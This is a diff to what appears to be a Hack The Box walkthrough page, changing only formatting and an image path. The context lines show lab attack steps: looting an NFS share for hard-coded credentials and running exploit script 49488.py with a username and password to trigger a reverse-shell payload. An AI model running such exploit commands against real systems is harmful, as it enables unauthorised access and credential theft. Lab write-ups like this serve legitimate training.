@@ -176,7 +176,8 @@ Copying and accessing the file share:
 
 <pre><code><strong>mkdir nfs-loot
 </strong><strong>cp -R /mnt/Remote-Backup/* nfs-loot/
-</strong>cd nfs-loot</code></pre>
+</strong>cd nfs-loot
+</code></pre>
 
 * There are lots of files in here; this will take some time
 * What we are doing is looking for hard-coded credentials
@@ -290,7 +291,7 @@ Detonate the reverse shell payload:
 python 49488.py -u admin@htb.local -p baconandcheese -i 'http://10.129.60.40' -c powershell.exe -a "C:/ftp_transfer/shell-x64.exe"
 ```
 
-<figure><img src="../../../.gitbook/assets/image (7) (2).png" alt=""><figcaption><p>Shell</p></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (7) (2) (2).png" alt=""><figcaption><p>Shell</p></figcaption></figure>
 
 ## Privilege Escalation
 
